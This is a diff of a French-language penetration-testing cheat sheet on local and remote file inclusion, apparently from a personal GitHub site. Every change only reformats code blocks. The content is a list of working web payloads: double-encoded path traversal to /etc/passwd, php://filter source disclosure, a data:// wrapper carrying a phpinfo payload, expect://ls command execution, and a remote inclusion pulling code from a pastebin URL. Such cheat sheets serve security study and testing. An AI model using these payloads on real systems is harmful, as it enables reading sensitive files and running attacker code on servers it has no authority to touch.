@@ -100,25 +100,36 @@ Les fichiers intéressants :
 
 **Double Encoding**
 
-```https://fhbapt.github.io/?page=%252e%252e%252fetc%252fpasswd```
+```
+https://fhbapt.github.io/?page=%252e%252e%252fetc%252fpasswd
+```
 
-```https://fhbapt.github.io/?page=%252e%252e%252fetc%252fpasswd%00```
+```
+https://fhbapt.github.io/?page=%252e%252e%252fetc%252fpasswd%00
+```
 
 **Wrapper php://filter**
 
-```https://fhbapt.github.io/?page=php://filter/convert.base64-encode/resource=index.php```
+```
+https://fhbapt.github.io/?page=php://filter/convert.base64-encode/resource=index.php
+```
 
-```http://example.com/index.php?page=pHp://FilTer/convert.base64-encode/resource=index.php```
+```
+http://example.com/index.php?page=pHp://FilTer/convert.base64-encode/resource=index.php
+```
 
 **Wrapper data://**
 
-```https://fhbapt.github.io/?page=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==```
-
-La payload est ```<?php phpinfo(); ?>```
+```
+https://fhbapt.github.io/?page=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==
+La payload est <?php phpinfo(); ?>
+```
 
 **Wrapper expect://**
 
-```https://fhbapt.github.io/?page=expect://ls```
+```
+https://fhbapt.github.io/?page=expect://ls
+```
 
 ### RFI (Remote File Inclusion) <a name="rfi"></a>
 
@@ -132,4 +143,6 @@ Exemple de RFI :
 
 Utilisation de pastbin pour émuler le serveur et inclure le code du pastbin:
 
-```https://fhbapt.github.io/?page=https://pastebin.com/raw/G68SZPQG``` 
+```
+https://fhbapt.github.io/?page=https://pastebin.com/raw/G68SZPQG
+``` 
